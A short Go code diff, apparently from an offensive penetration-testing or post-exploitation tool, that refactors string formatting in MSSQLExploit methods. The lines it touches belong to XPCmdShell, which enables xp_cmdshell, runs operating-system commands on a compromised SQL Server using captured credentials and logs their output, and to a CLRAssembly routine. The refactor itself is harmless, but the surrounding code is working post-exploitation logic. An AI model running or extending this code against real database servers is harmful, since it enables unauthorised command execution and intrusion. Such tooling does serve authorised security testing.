@@ -30,7 +30,7 @@ func (m *MSSQLExploit) XPCmdShell(creds *DBCreds, result *PostExploitResult) (*P
 	for _, q := range enableQueries {
 		_, err := m.executeQuery(creds, q)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[enable] Error: %v\n", err))
+			fmt.Fprintf(&output, "[enable] Error: %v\n", err)
 		}
 	}
 
@@ -39,10 +39,10 @@ func (m *MSSQLExploit) XPCmdShell(creds *DBCreds, result *PostExploitResult) (*P
 		query := fmt.Sprintf(`EXEC xp_cmdshell '%s'`, cmd)
 		resp, err := m.executeQuery(creds, query)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", cmd, err))
+			fmt.Fprintf(&output, "[%s] Error: %v\n", cmd, err)
 			continue
 		}
-		output.WriteString(fmt.Sprintf("[%s] Output: %s\n", cmd, resp))
+		fmt.Fprintf(&output, "[%s] Output: %s\n", cmd, resp)
 	}
 
 	disableQueries := []string{
@@ -89,10 +89,10 @@ func (m *MSSQLExploit) CLRAssembly(creds *DBCreds, result *PostExploitResult) (*
 	for _, q := range queries {
 		resp, err := m.executeQuery(creds, q.query)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", q.name, err))
+			fmt.Fprintf(&output, "[%s] Error: %v\n", q.name, err)
 			continue
 		}
-		output.WriteString(fmt.Sprintf("[%s] OK: %s\n", q.name, resp))
+		fmt.Fprintf(&output, "[%s] OK: %s\n", q.name, resp)
 	}
 
 	if output.Len() > 0 {
